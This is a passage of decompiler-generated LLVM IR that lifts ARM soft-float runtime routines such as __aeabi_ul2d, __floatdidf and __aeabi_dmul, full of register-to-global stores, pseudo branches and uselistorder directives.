  %v0_1de9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1de9c, i32 %v0_1de9c)
  store i32 896, i32* @r4, align 4
  %v0_1dea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dea8 = and i32 %v0_1dea8, -2147483648
  store i32 %v1_1dea8, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1dea8 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1deac = bitcast float %tmp11 to i32
  store i32 %v1_1deac, i32* @r1, align 4
  %v0_1deb0 = call i32 @function_1dc68()
  ret i32 %v0_1deb0

; uselistorder directives
  uselistorder i32 %v3_1de78, { 1, 2, 0 }
  uselistorder i32 %v2_1de74, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1dc68, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1deb4 = or i32 %arg2, %arg1
  %v4_1deb4 = icmp eq i32 %v2_1deb4, 0
  %v0_1deb8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1deb4, i32 %v0_1deb8)
  store i32 0, i32* @r5, align 4
  %v0_1dec4 = call i32 @function_1dee4()
  ret i32 %v0_1dec4
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1dec8 = or i32 %arg2, %arg1
  %v4_1dec8 = icmp eq i32 %v2_1dec8, 0
  %v0_1decc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1dec8, i32 %v0_1decc)
  %v1_1ded8 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1ded8, i32 ptrtoint (i32* @global_var_1dee4.1239 to i32))
  %v1_1dedc = sub i32 0, %arg1
  ret i32 %v1_1dedc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1dee4() local_unnamed_addr {
dec_label_pc_1dee4:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1deec = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1deec, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1dc08.1237 to i32))
  %tmp6 = icmp ult i32 %v0_1deec, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1dee4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1dee4, %bb
  %v1_1df04 = phi i32 [ 3, %dec_label_pc_1dee4 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1deec, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1df04 = add nuw nsw i32 %v1_1df04, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1df08 = phi i32 [ %v1_1df04, %bb3 ], [ %v2_1df04, %bb4 ]
  %not. = icmp slt i32 %v0_1deec, 0
  %v4_1df08 = zext i1 %not. to i32
  %v5_1df08 = add nsw i32 %v0_1df08, %v4_1df08
  %v1_1df0c = sub nsw i32 32, %v5_1df08
  %v0_1df10 = load i32, i32* @r0, align 4
  %v6_1df10 = shl i32 %v0_1df10, %v1_1df0c
  store i32 %v6_1df10, i32* @ip, align 4
  %v6_1df14 = lshr i32 %v0_1df10, %v5_1df08
  %v1_1df18 = load i32, i32* @r1, align 4
  %v7_1df18 = shl i32 %v1_1df18, %v1_1df0c
  %v8_1df18 = or i32 %v7_1df18, %v6_1df14
  %v6_1df1c = lshr i32 %v1_1df18, %v5_1df08
  %v0_1df20 = load i32, i32* %r4.global-to-local, align 4
  %v2_1df20 = add i32 %v0_1df20, %v5_1df08
  store i32 %v2_1df20, i32* @r4, align 4
  %v4_1df24 = sext i32 %v8_1df18 to i64
  %v5_1df24 = call i32 @function_1dc08(i64 %v4_1df24, i32 %v6_1df1c, i32 %v5_1df08, i32 %v1_1df0c)
  ret i32 %v5_1df24

; uselistorder directives
  uselistorder i32 %v5_1df08, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 25, 26, 3, 19, 20, 27, 28, 21, 22, 5, 6, 31, 2, 0, 7, 23, 1, 8, 9, 10, 11, 12, 13, 14, 24, 15, 18, 16, 17, 29, 30 }
  uselistorder i32 3, { 55, 13, 41, 70, 42, 71, 72, 73, 75, 9, 76, 17, 77, 57, 0, 14, 78, 10, 1, 2, 67, 58, 3, 4, 43, 44, 86, 45, 46, 47, 48, 49, 50, 59, 7, 21, 60, 22, 23, 62, 24, 63, 25, 64, 26, 65, 27, 66, 54, 8, 56, 51, 87, 15, 82, 19, 83, 18, 84, 20, 81, 11, 79, 12, 61, 5, 74, 85, 52, 6, 28, 68, 29, 30, 69, 31, 53, 34, 33, 32, 40, 80, 35, 36, 37, 38, 39, 16 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1df28 = load i32, i32* @r4, align 4
  store i32 %v3_1df28, i32* %stack_var_-16, align 4
  %v12_1df28 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1df34 = udiv i32 %arg2, 1048576
  %v5_1df34 = urem i32 %v4_1df34, 2048
  store i32 %v5_1df34, i32* %r4.global-to-local, align 4
  %v6_1df34 = icmp eq i32 %v5_1df34, 0
  br i1 %v6_1df34, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1df38 = udiv i32 %arg4, 1048576
  %v6_1df38 = urem i32 %v5_1df38, 2048
  store i32 %v6_1df38, i32* @r5, align 4
  %v7_1df38 = icmp eq i32 %v6_1df38, 0
  br i1 %v7_1df38, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1df3c = icmp eq i32 %v5_1df34, 2047
  br i1 %v5_1df3c, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1df40 = icmp eq i32 %v6_1df38, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1df44 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1df40, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1df48.1242 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1df44, i32 ptrtoint (i32* @global_var_1e120.1240 to i32))
  %v0_1df48 = load i32, i32* %r4.global-to-local, align 4
  %v1_1df48 = load i32, i32* @r5, align 4
  %v2_1df48 = add i32 %v1_1df48, %v0_1df48
  store i32 %v2_1df48, i32* %r4.global-to-local, align 4
  %v2_1df4c = xor i32 %arg4, %arg2
  %v1_1df50 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1df50, -2097152
  %v5_1df50 = add i32 %tmp51, -1
  %v6_1df50 = and i32 %v5_1df50, %arg2
  store i32 %v6_1df50, i32* %r1.global-to-local, align 4
  %v6_1df54 = and i32 %v5_1df50, %arg4
  %v5_1df58 = mul i32 %arg2, 4096
  %v6_1df58 = or i32 %v5_1df58, %tmp32
  %v8_1df58 = icmp eq i32 %v6_1df58, 0
  br i1 %v8_1df58, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1df605 = or i32 %v6_1df50, 1048576
  store i32 %v1_1df605, i32* %r1.global-to-local, align 4
  %v1_1df647 = or i32 %v6_1df54, 1048576
  br label %dec_label_pc_1dfe4

bb40:                                             ; preds = %.thread2
  %v6_1df5c = mul i32 %arg4, 4096
  %v7_1df5c = or i32 %v6_1df5c, %arg3
  %v9_1df5c = icmp eq i32 %v7_1df5c, 0
  %v1_1df60 = or i32 %v6_1df50, 1048576
  store i32 %v1_1df60, i32* %r1.global-to-local, align 4
  %v1_1df64 = or i32 %v6_1df54, 1048576
  br i1 %v9_1df5c, label %dec_label_pc_1dfe4, label %dec_label_pc_1df6c

dec_label_pc_1df6c:                               ; preds = %bb40
  %v6_1df6c = mul nuw i64 %tmp, %arg1
  %v7_1df6c = udiv i64 %v6_1df6c, 4294967296
  %v9_1df6c = trunc i64 %v6_1df6c to i32
  store i32 %v9_1df6c, i32* %ip.global-to-local, align 4
  %v7_1df74 = zext i32 %v1_1df60 to i64
  %v11_1df74 = mul nuw nsw i64 %v7_1df74, %tmp
  %v12_1df74 = add i64 %v11_1df74, %v7_1df6c
  %v1_1df78 = and i32 %v2_1df4c, -2147483648
  %v10_1df7c = zext i32 %v1_1df64 to i64
  %v11_1df7c = mul nuw i64 %v10_1df7c, %arg1
  %v12_1df7c = add i64 %v12_1df74, %v11_1df7c
  %v13_1df7c = udiv i64 %v12_1df7c, 4294967296
  %v15_1df7c = trunc i64 %v12_1df7c to i32
  %v10_1df84 = mul nuw i64 %v10_1df7c, %v7_1df74
  %v11_1df84 = add i64 %v13_1df7c, %v10_1df84
  %v12_1df84 = udiv i64 %v11_1df84, 4294967296
  %v13_1df84 = trunc i64 %v12_1df84 to i32
  %v14_1df84 = trunc i64 %v11_1df84 to i32
  %v2_1df88 = icmp eq i32 %v9_1df6c, 0
  br i1 %v2_1df88, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1df6c
  %v2_1df8c = or i32 %v15_1df7c, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1df6c, %bb41
  %storemerge = phi i32 [ %v2_1df8c, %bb41 ], [ %v15_1df7c, %dec_label_pc_1df6c ]
  %v0_1dfa0 = phi i32 [ %v2_1df8c, %bb41 ], [ %v15_1df7c, %dec_label_pc_1df6c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1df90 = add i32 %v2_1df48, -255
  %v2_1df94 = icmp ugt i32 %v13_1df84, 511
  %v2_1df98 = icmp eq i1 %v2_1df94, false
  %v3_1df98 = add i32 %v2_1df48, -1023
  %v5_1df98 = sext i1 %v2_1df98 to i32
  %v6_1df98 = add i32 %v3_1df98, %v5_1df98
  store i32 %v6_1df98, i32* %r4.global-to-local, align 4
  %v3_1df9c = icmp ugt i32 %v1_1df90, 768
  br i1 %v3_1df9c, label %dec_label_pc_1dfac, label %dec_label_pc_1dfa0

dec_label_pc_1dfa0:                               ; preds = %bb42
  %v1_1dfa0 = icmp slt i32 %v0_1dfa0, 0
  %v2_1dfa0 = mul i32 %v0_1dfa0, 2
  store i32 %v2_1dfa0, i32* %lr.global-to-local, align 4
  %v3_1dfa4 = mul i32 %v14_1df84, 2
  %v4_1dfa4 = zext i1 %v1_1dfa0 to i32
  %v5_1dfa4 = or i32 %v4_1dfa4, %v3_1dfa4
  %v9_1dfa4 = icmp ule i32 %v5_1dfa4, %v14_1df84
  %v10_1dfa4 = icmp ult i32 %v3_1dfa4, %v14_1df84
  %v11_1dfa4 = select i1 %v1_1dfa0, i1 %v9_1dfa4, i1 %v10_1dfa4
  %v3_1dfa825 = mul nuw nsw i64 %v12_1df84, 2
  %v3_1dfa8 = trunc i64 %v3_1dfa825 to i32
  %v4_1dfa8 = zext i1 %v11_1dfa4 to i32
  %v5_1dfa8 = or i32 %v4_1dfa8, %v3_1dfa8
  br label %dec_label_pc_1dfac

dec_label_pc_1dfac:                               ; preds = %bb42, %dec_label_pc_1dfa0
  %v0_1dfbc = phi i32 [ %v0_1dfa0, %bb42 ], [ %v2_1dfa0, %dec_label_pc_1dfa0 ]
  %v0_1dfb4 = phi i32 [ %v14_1df84, %bb42 ], [ %v5_1dfa4, %dec_label_pc_1dfa0 ]
  %v1_1dfac = phi i32 [ %v13_1df84, %bb42 ], [ %v5_1dfa8, %dec_label_pc_1dfa0 ]
  %v4_1dfac = mul i32 %v1_1dfac, 2048
  %v4_1dfb0 = udiv i32 %v0_1dfb4, 2097152
  %v5_1dfac = or i32 %v4_1dfb0, %v1_1df78
  %v5_1dfb0 = or i32 %v5_1dfac, %v4_1dfac
  store i32 %v5_1dfb0, i32* %r1.global-to-local, align 4
  %v3_1dfb4 = mul i32 %v0_1dfb4, 2048
  %v4_1dfb8 = udiv i32 %v0_1dfbc, 2097152
  %v5_1dfb8 = or i32 %v3_1dfb4, %v4_1dfb8
  store i32 %v5_1dfb8, i32* %r0.global-to-local, align 4
  %v3_1dfbc = mul i32 %v0_1dfbc, 2048
  store i32 %v3_1dfbc, i32* %lr.global-to-local, align 4
  %v1_1dfc0 = add i32 %v6_1df98, -253
  store i32 %v1_1dfc0, i32* %ip.global-to-local, align 4
  %v2_1dfc0 = icmp ugt i32 %v6_1df98, 252
  %v7_1dfc0 = icmp eq i32 %v6_1df98, 253
  %v2_1dfc4 = xor i1 %v7_1dfc0, true
  %v3_1dfc4 = and i1 %v2_1dfc0, %v2_1dfc4
  br i1 %v3_1dfc4, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1dfac
  %v6_1dfc4 = icmp ugt i32 %v1_1dfc0, 1791
  %v11_1dfc4 = icmp eq i32 %v1_1dfc0, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1dfac, %bb43
  %v1_1dfc8 = phi i1 [ %v7_1dfc0, %dec_label_pc_1dfac ], [ %v11_1dfc4, %bb43 ]
  %v0_1dfc8 = phi i1 [ %v2_1dfc0, %dec_label_pc_1dfac ], [ %v6_1dfc4, %bb43 ]
  %v2_1dfc8 = xor i1 %v1_1dfc8, true
  %v3_1dfc8 = and i1 %v0_1dfc8, %v2_1dfc8
  call void @__pseudo_cond_branch(i1 %v3_1dfc8, i32 ptrtoint (i32* @global_var_1e014.1241 to i32))
  %v0_1dfcc = load i32, i32* %lr.global-to-local, align 4
  %v2_1dfcc = icmp slt i32 %v0_1dfcc, 0
  %v6_1dfcc = icmp eq i32 %v0_1dfcc, -2147483648
  %v1_1dfd0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1dfcc, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1dfd0 = urem i32 %v1_1dfd0, 2
  %v3_1dfd0 = icmp ne i32 %v2_1dfd0, 0
  %v4_1dfd0 = udiv i32 %v1_1dfd0, 2
  store i32 %v4_1dfd0, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1dfd4 = phi i1 [ %v3_1dfd0, %bb45 ], [ %v2_1dfcc, %bb44 ]
  %v2_1dfd4 = zext i1 %v1_1dfd4 to i32
  %v3_1dfd4 = add i32 %v2_1dfd4, %v1_1dfd0
  store i32 %v3_1dfd4, i32* %r0.global-to-local, align 4
  %v0_1dfd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dfd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dfd8 = and i32 %v1_1dfd8, 4096
  %v3_1dfd8 = icmp ne i32 %v2_1dfd8, 0
  %v4_1dfd8 = mul i32 %v1_1dfd8, 1048576
  %v6_1dfd8 = add i32 %v4_1dfd8, %v0_1dfd8
  %v7_1dfd8 = zext i1 %v3_1dfd8 to i32
  %v8_1dfd8 = add i32 %v7_1dfd8, %v6_1dfd8
  store i32 %v8_1dfd8, i32* %r1.global-to-local, align 4
  %v2_1dfdc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1dfdc, i32* %r4.global-to-local, align 4
  store i32 %v12_1df28, i32* %lr.global-to-local, align 4
  ret i32 %v3_1dfd4

dec_label_pc_1dfe4:                               ; preds = %.thread3, %bb40
  %v1_1dff0 = phi i32 [ %v1_1df647, %.thread3 ], [ %v1_1df64, %bb40 ]
  %v1_1dfe8 = phi i32 [ %v1_1df605, %.thread3 ], [ %v1_1df60, %bb40 ]
  %v1_1dfe4 = and i32 %v2_1df4c, -2147483648
  %v2_1dfe8 = or i32 %v1_1dfe8, %v1_1dfe4
  %v4_1dfec1 = or i64 %tmp, %arg1
  %v4_1dfec = trunc i64 %v4_1dfec1 to i32
  store i32 %v4_1dfec, i32* %r0.global-to-local, align 4
  %v2_1dff0 = xor i32 %v2_1dfe8, %v1_1dff0
  store i32 %v2_1dff0, i32* %r1.global-to-local, align 4
  %v4_1dff4 = udiv i32 %v1_1df50, 2
  %v5_1dff4 = sub i32 %v2_1df48, %v4_1dff4
  store i32 %v5_1dff4, i32* %r4.global-to-local, align 4
  %v7_1dff4 = sub i32 0, %v5_1dff4
  %v8_1dff4 = and i32 %v2_1df48, %v7_1dff4
  %v11_1dff4 = icmp eq i32 %v2_1df48, %v4_1dff4
  %v7_1dff8 = icmp sgt i32 %v2_1df48, %v4_1dff4
  br i1 %v7_1dff8, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1dfe4
  %v10_1dff8 = sub i32 %v1_1df50, %v5_1dff4
  %v12_1dff8 = xor i32 %v5_1dff4, %v1_1df50
  %v13_1dff8 = xor i32 %v10_1dff8, %v1_1df50
  %v14_1dff8 = and i32 %v13_1dff8, %v12_1dff8
  %v17_1dff8 = icmp eq i32 %v1_1df50, %v5_1dff4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1dfe4, %bb46
  %v3_1e004.in = phi i32 [ %v8_1dff4, %dec_label_pc_1dfe4 ], [ %v14_1dff8, %bb46 ]
  %v2_1e004.in = phi i32 [ %v5_1dff4, %dec_label_pc_1dfe4 ], [ %v10_1dff8, %bb46 ]
  %v1_1e004 = phi i1 [ %v11_1dff4, %dec_label_pc_1dfe4 ], [ %v17_1dff8, %bb46 ]
  %v2_1e004 = icmp slt i32 %v2_1e004.in, 0
  %v3_1e004 = icmp slt i32 %v3_1e004.in, 0
  %v3_1dffc = xor i1 %v3_1e004, %v2_1e004
  %v4_1dffc = or i1 %v1_1e004, %v3_1dffc
  br i1 %v4_1dffc, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1e004.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1dffc30 = mul i32 %v5_1dff4, 1048576
  %v10_1dffc31 = or i32 %v2_1dff0, %v9_1dffc30
  store i32 %v10_1dffc31, i32* %r1.global-to-local, align 4
  %v7_1e000 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1e000, i32* %r4.global-to-local, align 4
  store i32 %v12_1df28, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1e004 = phi i32 [ %v0_1e004.pre, %._crit_edge23 ], [ %v12_1df28, %bb48 ]
  %v6_1e004 = xor i1 %v4_1dffc, true
  call void @__pseudo_cond_branch(i1 %v6_1e004, i32 %v0_1e004)
  %v0_1e008 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e008 = or i32 %v0_1e008, 1048576
  store i32 %v1_1e008, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1e010 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e010 = add i32 %v0_1e010, -1
  store i32 %v1_1e010, i32* %r4.global-to-local, align 4
  ret i32 %v4_1dfec

; uselistorder directives
  uselistorder i32 %v5_1dff4, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1dff4, { 2, 1, 0 }
  uselistorder i32 %v1_1dfd0, { 2, 0, 1 }
  uselistorder i32 %v0_1dfcc, { 1, 0 }
  uselistorder i1 %v7_1dfc0, { 1, 0 }
  uselistorder i32 %v2_1dfa0, { 1, 0 }
  uselistorder i1 %v1_1dfa0, { 1, 0 }
  uselistorder i32 %v6_1df98, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1dfa0, { 1, 0, 2 }
  uselistorder i32 %v14_1df84, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1df84, { 1, 0 }
  uselistorder i64 %v12_1df7c, { 1, 0 }
  uselistorder i64 %v10_1df7c, { 1, 0 }
  uselistorder i64 %v7_1df74, { 1, 0 }
  uselistorder i64 %v6_1df6c, { 1, 0 }
  uselistorder i32 %v6_1df54, { 1, 0 }
  uselistorder i32 %v6_1df50, { 1, 0, 2 }
  uselistorder i32 %v1_1df50, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1df48, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1df38, { 2, 1, 0 }
  uselistorder i32 %v5_1df34, { 2, 1, 0 }
  uselistorder i32 %v12_1df28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1dfe4, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1dfac, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1e014() local_unnamed_addr {
dec_label_pc_1e014:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1e014 = load i1, i1* @cpsr_z, align 1
  %v1_1e014 = load i1, i1* @cpsr_n, align 1
  %v2_1e014 = load i1, i1* @cpsr_v, align 1
  %v3_1e014 = xor i1 %v1_1e014, %v2_1e014
  %v4_1e014 = or i1 %v0_1e014, %v3_1e014
  br i1 %v4_1e014, label %dec_label_pc_1e018, label %dec_label_pc_1e190

dec_label_pc_1e018:                               ; preds = %dec_label_pc_1e014
  %v0_1e018 = load i32, i32* @r4, align 4
  %v4_1e018 = add i32 %v0_1e018, 54
  %v6_1e018 = sub i32 0, %v0_1e018
  %v7_1e018 = and i32 %v4_1e018, %v6_1e018
  %v8_1e018 = icmp slt i32 %v7_1e018, 0
  %v9_1e018 = icmp slt i32 %v4_1e018, 0
  %v10_1e018 = icmp eq i32 %v4_1e018, 0
  %v7_1e01c = icmp sgt i32 %v0_1e018, -54
  br i1 %v7_1e01c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1e018
  store i32 0, i32* @r0, align 4
  %v8_1e020 = load i32, i32* @r1, align 4
  %v9_1e020 = and i32 %v8_1e020, -2147483648
  store i32 %v9_1e020, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1e018, %bb
  %v4_1e028 = xor i1 %v9_1e018, %v8_1e018
  %v5_1e028 = or i1 %v10_1e018, %v4_1e028
  call void @__pseudo_cond_branch(i1 %v5_1e028, i32 %tmp7)
  %v0_1e02c = load i32, i32* @r4, align 4
  %v1_1e02c = sub i32 0, %v0_1e02c
  %v2_1e030 = sub i32 -32, %v0_1e02c
  %v4_1e030 = add i32 %v0_1e02c, 31
  %v5_1e030 = and i32 %v4_1e030, %v1_1e02c
  %v6_1e030 = icmp slt i32 %v5_1e030, 0
  store i1 %v6_1e030, i1* @cpsr_v, align 1
  %v6_1e034 = icmp slt i32 %v1_1e02c, 32
  br i1 %v6_1e034, label %dec_label_pc_1e038, label %dec_label_pc_1e0a4

dec_label_pc_1e038:                               ; preds = %.thread1
  %v1_1e038 = add i32 %v2_1e030, 12
  %v8_1e03c = icmp sgt i32 %v1_1e038, 0
  br i1 %v8_1e03c, label %dec_label_pc_1e074, label %dec_label_pc_1e040

dec_label_pc_1e040:                               ; preds = %dec_label_pc_1e038
  %v1_1e040 = add i32 %v2_1e030, 32
  %v1_1e044 = sub i32 0, %v2_1e030
  %v0_1e048 = load i32, i32* @r0, align 4
  %v6_1e048 = shl i32 %v0_1e048, %v1_1e044
  %v2_1e04c = add i32 %v2_1e030, 31
  %v3_1e04c = shl i32 1, %v2_1e04c
  %v6_1e04c = lshr i32 %v0_1e048, %v1_1e040
  %v1_1e050 = load i32, i32* @r1, align 4
  %v7_1e050 = shl i32 %v1_1e050, %v1_1e044
  %v8_1e050 = or i32 %v7_1e050, %v6_1e04c
  %v1_1e054 = and i32 %v1_1e050, -2147483648
  %tmp = bitcast i32 %v1_1e050 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1e058 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1e048, 0
  %v4_1e05c = zext i1 %tmp20 to i32
  %v5_1e05c = add i32 %v8_1e050, %v4_1e05c
  %v5_1e060 = and i32 %v1_1e058, %v3_1e04c
  %v6_1e060 = icmp ne i32 %v5_1e060, 0
  %v7_1e060 = lshr i32 %v1_1e058, %v1_1e040
  %v9_1e060 = add i32 %v7_1e060, %v1_1e054
  %v10_1e060 = zext i1 %v6_1e060 to i32
  %v11_1e060 = add i32 %v9_1e060, %v10_1e060
  store i32 %v11_1e060, i32* @r1, align 4
  %v19_1e060 = add i32 %v11_1e060, %v10_1e060
  %v20_1e060 = xor i32 %v19_1e060, %v1_1e050
  %v21_1e060 = xor i32 %v19_1e060, %v7_1e060
  %v22_1e060 = and i32 %v20_1e060, %v21_1e060
  %v23_1e060 = icmp slt i32 %v22_1e060, 0
  store i1 %v23_1e060, i1* @cpsr_v, align 1
  %v3_1e064 = mul i32 %v6_1e048, 2
  %v4_1e064 = or i32 %v3_1e064, %tmp7
  %v5_1e064 = icmp slt i32 %v4_1e064, 0
  store i1 %v5_1e064, i1* @cpsr_n, align 1
  %v6_1e064 = icmp eq i32 %v4_1e064, 0
  store i1 %v6_1e064, i1* @cpsr_z, align 1
  br i1 %v6_1e064, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1e040
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1e068 = add nsw i32 %tmp21, -1
  %v7_1e068 = and i32 %v5_1e05c, %v6_1e068
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1e040, %bb13
  %v1_1e070 = phi i32 [ %v5_1e05c, %dec_label_pc_1e040 ], [ %v7_1e068, %bb13 ]
  %v2_1e06c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1e06c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1e070

dec_label_pc_1e074:                               ; preds = %dec_label_pc_1e038
  %v1_1e074 = sub i32 0, %v2_1e030
  %v1_1e078 = add i32 %v2_1e030, 32
  %v0_1e07c = load i32, i32* @r0, align 4
  %v6_1e07c = shl i32 %v0_1e07c, %v1_1e074
  %v6_1e080 = lshr i32 %v0_1e07c, %v1_1e078
  %v1_1e084 = load i32, i32* @r1, align 4
  %v7_1e084 = shl i32 %v1_1e084, %v1_1e074
  %v8_1e084 = or i32 %v7_1e084, %v6_1e080
  %v1_1e088 = and i32 %v1_1e084, -2147483648
  %tmp22 = icmp slt i32 %v6_1e07c, 0
  %v4_1e08c = zext i1 %tmp22 to i32
  %v5_1e08c = add i32 %v8_1e084, %v4_1e08c
  %v6_1e08c = icmp ult i32 %v5_1e08c, %v8_1e084
  %v2_1e090 = zext i1 %v6_1e08c to i32
  %v3_1e090 = or i32 %v2_1e090, %v1_1e088
  store i32 %v3_1e090, i32* @r1, align 4
  %v9_1e090 = add nsw i32 %v3_1e090, %v2_1e090
  %v10_1e090 = sub i32 0, %v1_1e084
  %v11_1e090 = and i32 %v9_1e090, %v10_1e090
  %v12_1e090 = icmp slt i32 %v11_1e090, 0
  store i1 %v12_1e090, i1* @cpsr_v, align 1
  %v3_1e094 = mul i32 %v6_1e07c, 2
  %v4_1e094 = or i32 %v3_1e094, %tmp7
  %v5_1e094 = icmp slt i32 %v4_1e094, 0
  store i1 %v5_1e094, i1* @cpsr_n, align 1
  %v6_1e094 = icmp eq i32 %v4_1e094, 0
  store i1 %v6_1e094, i1* @cpsr_z, align 1
  br i1 %v6_1e094, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1e074
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1e098 = add nsw i32 %tmp23, -1
  %v7_1e098 = and i32 %v5_1e08c, %v6_1e098
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1e074, %bb15
  %v1_1e0a0 = phi i32 [ %v5_1e08c, %dec_label_pc_1e074 ], [ %v7_1e098, %bb15 ]
  %v2_1e09c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1e09c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1e0a0

dec_label_pc_1e0a4:                               ; preds = %.thread1
  %v1_1e0a4 = sub i32 32, %v2_1e030
  %v1_1e0a8 = load i32, i32* @r0, align 4
